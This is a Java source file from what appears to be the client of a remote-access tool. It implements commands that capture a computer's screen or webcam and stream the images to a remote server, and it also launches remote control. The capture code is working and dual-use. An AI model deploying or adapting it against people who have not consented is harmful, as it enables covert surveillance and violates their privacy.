package br.com.introcdc.connect.client.commands.image;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:28
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ControlComponents;
import br.com.introcdc.connect.client.components.ImageComponents;
import br.com.introcdc.connect.client.components.ProcessComponents;
import com.github.sarxos.webcam.Webcam;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

public class ClientCommandScreenWebcam extends ClientCommand {

    public ClientCommandScreenWebcam() {
        super("screen", "webcam");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        boolean webcam = command.toLowerCase().equalsIgnoreCase("webcam");
        if (webcam) {
            if (ImageComponents.WEBCAM_LIVE) {
                ImageComponents.WEBCAM_LIVE = false;
                msg("Transmissão de webcam interrompida!");
                try {
                    Webcam cam = ImageComponents.getWebcam(ProcessComponents.LAST_ID);
                    if (cam != null && cam.isOpen()) {
                        cam.close();
                    }
                } catch (Exception exception) {
                    exception(exception);
                    msg("Ocorreu um erro ao fechar a webcam! (" + exception.getMessage() + ")");
                }
                try {
                    System.gc();
                } catch (Exception exception) {
                    msg("Ocorreu um erro ao liberar memória ram do computador! (" + exception.getMessage() + ")");
                    exception(exception);
                }
                return;
            }
        } else {
            if (ImageComponents.SCREEN_LIVE) {
                ImageComponents.SCREEN_LIVE = false;
                msg("Transmissão de tela interrompida!");
                try {
                    System.gc();
                } catch (Exception exception) {
                    msg("Ocorreu um erro ao liberar memória ram do computador! (" + exception.getMessage() + ")");
                    exception(exception);
                }
                return;
            }
        }

        if (input.isEmpty()) {
            input = "1";
        }
        try {
            int fps = input.split(" ").length > 1 ? Integer.parseInt(input.split(" ")[1]) : 0;
            if (fps > 60) {
                msg("FPS máximo: 60");
                return;
            }
            int id = Integer.parseInt(input.split(" ")[0]) - 1;
            msg("Inicializando conexão com a " + (webcam ? "webcam" : "tela") + "...");

            new Thread(() -> {
                BufferedImage image = webcam ? ImageComponents.getWebcam(id, fps > 0, true) : ImageComponents.getImage(id, true);
                if (image == null) {
                    msg(webcam ? "Webcam não encontrada!" : "Monitor não encontrado!");
                    return;
                }
                msg((webcam ? "webcam" : "screen") + "-" + (fps > 0 ? "live" : "image"));
                if (fps > 0) {
                    if (webcam) {
                        ImageComponents.WEBCAM_LIVE = true;
                    } else {
                        ImageComponents.SCREEN_LIVE = true;
                        new Thread(ControlComponents::startControlClient).start();
                    }
                    ScheduledFuture<?> TASK = ConnectClient.EXECUTOR.scheduleAtFixedRate(() -> {
                        try {
                            if ((webcam && !ImageComponents.WEBCAM_LIVE) || (!webcam && !ImageComponents.SCREEN_LIVE)) {
                                msg((ImageComponents.LIVE_STOPPER ? "stoplive" + (webcam ? "webcam" : "screen") : "") + "Atualizador da live parado - " + (webcam ? "webcam" : "screen"));
                                try {
                                    System.gc();
                                } catch (Exception exception) {
                                    msg("Ocorreu um erro ao liberar memória ram do computador! (" + exception.getMessage() + ")");
                                    exception(exception);
                                }
                                if (webcam) {
                                    ImageComponents.WEBCAM.cancel(true);
                                } else {
                                    ImageComponents.SCREEN.cancel(true);
                                }
                                return;
                            }

                            try (Socket imageSocket = new Socket(Connect.IP, Connect.PORT + (webcam ? 2 : 1));
                                 OutputStream os = imageSocket.getOutputStream()) {
                                ImageIO.write(webcam ? ImageComponents.getWebcam(id, true, true) : ImageComponents.getImage(id, true), "png", os);
                            } catch (Exception exception) {
                                if (ImageComponents.LIVE_STOPPER) {
                                    if (webcam) {
                                        if (ImageComponents.WEBCAM_LIVE) {
                                            ImageComponents.WEBCAM_LIVE = false;
                                            Webcam cam = ImageComponents.getWebcam(id);
                                            if (cam != null && cam.isOpen()) {
                                                cam.close();
                                            }
                                        }
                                    } else {
                                        if (ImageComponents.SCREEN_LIVE) {
                                            ImageComponents.SCREEN_LIVE = false;
                                        }
                                    }
                                    msg("stoplive" + (webcam ? "webcam" : "screen") + "Erro ao enviar imagem da transmissão - " + (webcam ? "webcam" : "screen"));
                                    if (webcam) {
                                        ImageComponents.WEBCAM.cancel(true);
                                    } else {
                                        ImageComponents.SCREEN.cancel(true);
                                    }
                                } else {
                                    msg("Ocorreu um erro ao enviar imagem da transmissão - " + (webcam ? "webcam" : "screen") + " (" + exception.getMessage() + ")");
                                    exception(exception);
                                }
                                try {
                                    System.gc();
                                } catch (Exception exception1) {
                                    msg("Ocorreu um erro ao liberar memória ram do computador! (" + exception1.getMessage() + ")");
                                    exception(exception1);
                                }
                                exception(exception);
                            }
                        } catch (Exception exception) {
                            msg("Ocorreu um erro ao cancelar o atualizador da live de " + (webcam ? "webcam" : "screen") + "! (" + exception.getMessage() + ")");
                            exception(exception);
                        }
                    }, 0, 1000 / fps, TimeUnit.MILLISECONDS);
                    if (webcam) {
                        ImageComponents.WEBCAM = TASK;
                    } else {
                        ImageComponents.SCREEN = TASK;
                    }
                } else {
                    ImageComponents.sendImage(webcam ? 2 : 1, image);
                }
            }).start();
        } catch (Exception ignored) {
            msg("Digite um número válido!");
        }
    }

}
